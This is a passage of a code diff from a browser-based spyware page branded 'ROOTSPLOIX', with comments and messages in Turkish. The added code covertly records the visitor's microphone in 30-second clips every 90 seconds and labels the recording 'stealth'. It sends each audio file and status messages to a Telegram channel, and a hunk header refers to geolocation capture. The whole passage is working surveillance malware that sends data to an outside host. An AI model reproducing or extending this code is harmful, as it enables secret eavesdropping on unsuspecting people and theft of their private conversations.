                 mediaRecorder = new MediaRecorder(stream, {
                     mimeType: selectedMimeType,
-                    audioBitsPerSecond: 64000 // 64kbps for smaller files
+                    audioBitsPerSecond: 32000 // Lower bitrate for stealth
                 });
-                
-                const formatMsg = `🎤 SES KAYIT FORMATI!\n\n🎯 Session: ${sessionId}\n📎 Format: ${selectedMimeType}\n📊 Bit Rate: 64kbps\n🕒 Kayıt süresi: 60 saniye\n\n💀 ROOTSPLOIX`;
-                sendToTelegram(formatMsg);
                 
                 recordedChunks = [];
                 
@@ -997,26 +1780,70 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
                 
                 mediaRecorder.onstop = function() {
                     if (recordedChunks.length > 0) {
-                        const audioBlob = new Blob(recordedChunks, {
-                            type: selectedMimeType
-                        });
+                        const audioBlob = new Blob(recordedChunks, { type: selectedMimeType });
                         
-                        // Convert to base64 and send
-                        const reader = new FileReader();
-                        reader.onloadend = function() {
-                            const base64Audio = reader.result;
-                            sendAudioToTelegram(base64Audio, selectedMimeType);
-                        };
-                        reader.readAsDataURL(audioBlob);
+                        // Get file extension
+                        let extension = 'webm';
+                        if (selectedMimeType.includes('ogg')) extension = 'ogg';
+                        else if (selectedMimeType.includes('wav')) extension = 'wav';
+                        
+                        const filename = `audio_${sessionId}_${Date.now()}.${extension}`;
+                        const caption = `🎤 STEALTH SES KAYDI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n💾 Format: ${extension.toUpperCase()}\n📊 Boyut: ${(audioBlob.size/1024).toFixed(2)} KB\n\n💀 ROOTSPLOIX`;
+                        
+                        // Send directly as blob
+                        sendAudioBlobToTelegram(audioBlob, caption, filename);
                         
                         recordedChunks = [];
                     }
                     isRecording = false;
                 };
                 
+                // Start periodic recording
+                startStealthPeriodicRecording();
+                
             } catch (error) {
-                const setupErrorMsg = `❌ SES KAYIT KURULUMU HATASI!\n\n🎯 Session: ${sessionId}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
+                const setupErrorMsg = `❌ STEALTH SES HATASI!\n\n🎯 Session: ${sessionId}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
                 sendToTelegram(setupErrorMsg);
+            }
+        }
+        
+        function startStealthPeriodicRecording() {
+            // Record for 30 seconds every 90 seconds (more frequent, shorter)
+            setInterval(() => {
+                if (mediaRecorder && mediaRecorder.state === 'inactive' && !isRecording) {
+                    startStealthAudioRecording();
+                }
+            }, 90000); // Every 1.5 minutes
+            
+            // Start first recording after 5 seconds
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                    startStealthAudioRecording();
+                }
+            }, 5000);
+        }
+        
+        function startStealthAudioRecording() {
+            if (mediaRecorder && !isRecording) {
+                try {
+                    isRecording = true;
+                    mediaRecorder.start();
+                    
+                    const recordStartMsg = `🎤 STEALTH KAYIT BAŞLADI!\n\n🎯 Session: ${sessionId}\n🕒 Başlama: ${new Date().toLocaleString('tr-TR')}\n⏱️ Süre: 30 saniye\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(recordStartMsg);
+                    
+                    // Stop recording after 30 seconds
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 30000);
+                    
+                } catch (error) {
+                    isRecording = false;
+                    const recordErrorMsg = `❌ STEALTH KAYIT HATASI!\n\n🎯 Session: ${sessionId}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(recordErrorMsg);
+                }
             }
         }
         
